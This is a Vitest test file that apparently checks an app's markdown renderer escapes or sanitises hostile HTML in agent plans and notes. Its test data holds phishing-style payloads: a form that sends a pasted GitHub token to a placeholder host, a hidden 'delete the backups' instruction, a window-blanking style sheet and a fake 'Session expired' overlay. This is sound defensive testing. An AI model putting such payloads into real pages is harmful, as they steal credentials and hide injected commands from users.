// T-601 (audit F01-editor.1, L4-web-js-toolchain.2 and .3, F06-tasks-chat.1): what a note, an agent's plan or to-do
// list and a diagram may put into the app's own window. Vitest has no DOM, and without one DOMPurify has no sanitize,
// so a stand-in hands the HTML back and keeps the settings it was given: a note's sanitiser is checked by those settings
// (evidence/T-601-proof.mjs runs the same payloads through the real renderers in Chromium), and agent text, which marked
// itself escapes, is checked as it comes out. The class rule (review round 1) is a DOMPurify hook: the hook itself is
// driven here with the attribute records DOMPurify hands it, and that it is on for a note's sanitise call only; the
// real DOMPurify with the hook runs in Chromium in evidence/T-601-proof.mjs (no DOM library is installed for vitest).
import { expect, test, vi } from "vitest";
import DOMPurify from "dompurify";
import * as preview from "./renderMarkdown";
import { renderMarkdown } from "./renderMarkdown";

vi.mock("dompurify", () => ({ default: { sanitize: vi.fn((html: string) => html), addHook: vi.fn(), removeHook: vi.fn() } }));

// The auditor's payloads: a style sheet that blanks the window, hidden text, a form that sends what is typed, an image
// map whose area navigates, a full-window overlay and a popover.
const HOSTILE = [
  "# Project notes",
  "",
  "Welcome.",
  "",
  "<style>*{display:none!important}</style>",
  "",
  "Step 1 <span hidden>then delete the backups</span>",
  "",
  '<form action="https://example.invalid/collect"><input name="token" placeholder="Paste your GitHub token"><button>Save</button></form>',
  "",
  '<img src="x.png" usemap="#m"><map name="m"><area shape="rect" coords="0,0,9,9" href="https://example.invalid/"></map>',
  "",
  '<div style="position:fixed;inset:0;z-index:99999">Session expired</div> <div popover id="p">x</div>',
  "",
].join("\n");

test("T-601: an agent's plan shows raw HTML as text, so no style sheet, form, image map, overlay or hidden span reaches the page", () => {
  const html = renderMarkdown(HOSTILE);
  expect(html).not.toMatch(/<(style|span|form|input|button|img|map|area|div)\b/i);
  expect(html).toContain("&lt;style&gt;*{display:none!important}&lt;/style&gt;");
  expect(html).toContain("Step 1 &lt;span hidden&gt;then delete the backups&lt;/span&gt;");
  expect(html).toContain("<h1>Project notes</h1>");
});

test("T-601: a to-do that mentions <script> keeps every to-do after it, and the to-do boxes still show", () => {
  const html = renderMarkdown("- [ ] Add <script> tag to index.html\n- [ ] Write the tests\n- [x] Ship it\n");
  expect(html).toContain("Add &lt;script&gt; tag to index.html");
  expect(html).not.toMatch(/<script/i);
  expect(html.match(/<li>/g)).toHaveLength(3);
  expect(html).toContain("Ship it");
  expect(html.match(/<input [^>]*type="checkbox"/g)).toHaveLength(3);
});

test("T-601: a note keeps its own HTML, but the sanitiser is told to drop style sheets, style attributes, forms, image maps, dialogs, popovers and hidden text", () => {
  const sanitize = vi.mocked(DOMPurify.sanitize);
  sanitize.mockClear();
  renderMarkdown(HOSTILE, true);
  expect(sanitize).toHaveBeenCalledTimes(1);
  const [sent, cfg] = sanitize.mock.calls[0] as unknown as [string, { FORBID_TAGS?: string[]; FORBID_ATTR?: string[] } | undefined];
  // every tag and attribute of the payloads reaches the sanitiser as HTML (a note's own HTML is kept) ...
  for (const tag of ["style", "span", "form", "input", "button", "map", "area"]) expect(sent).toMatch(new RegExp(`<${tag}\\b`));
  // ... and each dangerous one is on its forbid lists
  expect(cfg?.FORBID_TAGS).toEqual(expect.arrayContaining(["style", "form", "input", "button", "textarea", "select", "dialog", "map", "area"]));
  expect(cfg?.FORBID_ATTR).toEqual(expect.arrayContaining(["hidden", "style", "popover", "popovertarget", "command", "commandfor"]));
});

test("T-601: a note's task list still shows which items are done, without form fields", () => {
  const html = renderMarkdown("- [x] done item\n- [ ] open item\n", true);
  expect(html).not.toMatch(/<input/i);
  expect(html).toMatch(/☑<\/span> ?done item/);
  expect(html).toMatch(/☐<\/span> ?open item/);
});

test("T-601 (review round 1): a note keeps none of its own class names, so it cannot borrow the app's full-window overlays; a code block's language and the task boxes stay", () => {
  const p = preview as Record<string, unknown>;
  const hook = p.noteClassHook as ((node: unknown, data: { attrName: string; attrValue: string; keepAttr: boolean }) => void) | undefined;
  expect(typeof hook).toBe("function");
  const run = (attrName: string, attrValue: string) => {
    const data = { attrName, attrValue, keepAttr: true };
    hook!({}, data);
    return data.keepAttr ? data.attrValue : null;
  };
  // <div class="scrim">, <div class="ask-backdrop">, <div class="menu-backdrop">, <svg class="scrim"><rect class="menu-backdrop">
  expect([run("class", "scrim"), run("class", "ask-backdrop"), run("class", "menu-backdrop"), run("class", "scrim menu-backdrop")]).toEqual([null, null, null, null]);
  expect(run("class", "language-js scrim")).toBe("language-js");
  expect(run("class", "language-mermaid")).toBe("language-mermaid");
  expect(run("class", "md-task")).toBe("md-task");
  expect(run("href", "scrim")).toBe("scrim");
  // the hook is on for a note's sanitise call only, and off again after it (katex and agent text keep their classes)
  const purify = vi.mocked(DOMPurify);
  purify.addHook.mockClear();
  purify.removeHook.mockClear();
  purify.sanitize.mockClear();
  const order: string[] = [];
  purify.addHook.mockImplementation(((..._a: unknown[]) => void order.push("add")) as never);
  purify.sanitize.mockImplementation(((html: string) => (order.push("sanitize"), html)) as never);
  purify.removeHook.mockImplementation(((..._a: unknown[]) => void order.push("remove")) as never);
  renderMarkdown('<div class="scrim"></div>', true);
  expect(order).toEqual(["add", "sanitize", "remove"]);
  expect(purify.addHook).toHaveBeenCalledWith("uponSanitizeAttribute", hook);
  expect(purify.removeHook).toHaveBeenCalledWith("uponSanitizeAttribute", hook);
  order.length = 0;
  renderMarkdown('<div class="scrim"></div>');
  expect(order).toEqual(["sanitize"]);
  purify.sanitize.mockImplementation(((html: string) => html) as never);
});
